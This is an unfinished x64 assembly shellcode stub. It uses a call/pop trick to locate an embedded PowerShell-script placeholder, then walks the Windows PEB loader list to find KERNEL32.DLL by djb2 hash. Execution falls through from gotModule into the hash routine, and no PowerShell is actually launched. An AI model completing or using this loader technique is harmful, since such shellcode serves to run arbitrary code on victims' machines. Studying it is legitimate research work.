;structure for 64-bit PEB is taken from here:
;https://ntopcode.wordpress.com/2018/02/26/anatomy-of-the-process-environment-block-peb-windows-internals/
pre:
	call main
	db "%s", 0
main:
	pop rdi
	push rbp
	mov rbp, rsp
	sub rsp, 0x18
	mov [rbp - 8], rdi		;powershell script address
	mov rbx, gs:0x60 
	mov [rbp - 0x10], rbx		;PEB address
	mov rbx, [rbx + 0x18]	;offset to _PEB_LDR_DATA
	mov rbx, [rbx + 0x20]	;offset to _LDR_DATA_TABLE_ENTRY
	mov [rbp - 0x18], rbx
	loop:
		mov rcx, [rbp- 0x18]
		mov rcx, [rcx + 0x50]	;offset to the module name, this came from debugging
		call calHash
		cmp rax, 0x6ddb9555		;find KERNEL32.DLL
		jz gotModule
		mov rbx, [rbp - 0x18]
		mov rbx, [rbx]
		mov [rbp- 0x18], rbx	; move to the next entry
		jmp loop
	gotModule:
		mov rbx, [rbp - 0x18]
		mov rax, [rbx + 0x20]	;get the dll base address
	
calHash:
	; djb2 hashing algorithm
	push rbp
	mov rbp, rsp
	sub rsp, 0x18
	mov [rbp - 8], rcx
	mov rax, 0x1505
	mov [rbp - 0x10], rax
	hashLoop:
		mov rbx, [rbp - 8]
		movzx rbx, word [rbx]
		test rbx, rbx
		jz hashEnd

		mov ecx, [rbp - 0x10]
		mov edx, ecx
		shl ecx, 5
		add ecx, edx
		add ecx, ebx
		mov [rbp - 0x10], ecx

		mov rcx, [rbp - 8]
		add rcx, 2
		mov [rbp - 8], rcx
		jmp hashLoop

	hashEnd:
		xor rax, rax
		mov eax, [rbp - 0x10]
		mov rsp, rbp
		pop rbp
		ret
